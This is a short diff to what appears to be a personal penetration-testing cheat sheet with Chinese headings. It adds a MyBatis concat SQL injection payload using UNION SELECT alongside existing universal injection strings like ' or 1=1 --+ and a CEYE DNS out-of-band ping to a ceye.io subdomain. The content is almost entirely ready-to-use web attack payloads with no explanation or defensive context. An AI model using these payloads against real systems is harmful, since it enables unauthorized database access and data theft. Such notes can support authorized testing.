@@ -1,6 +1,9 @@
 ## CEYE DNS
    ping n.6vlqdr.ceye.io
 
+## mybatis concat #{name} 注入 payload
+*  ' UNION SELECT "1","2","3","4","5" -- '
+
 ## 注入万能尝试语法
     ' or 1=1 --+
     " or 1=1 --+
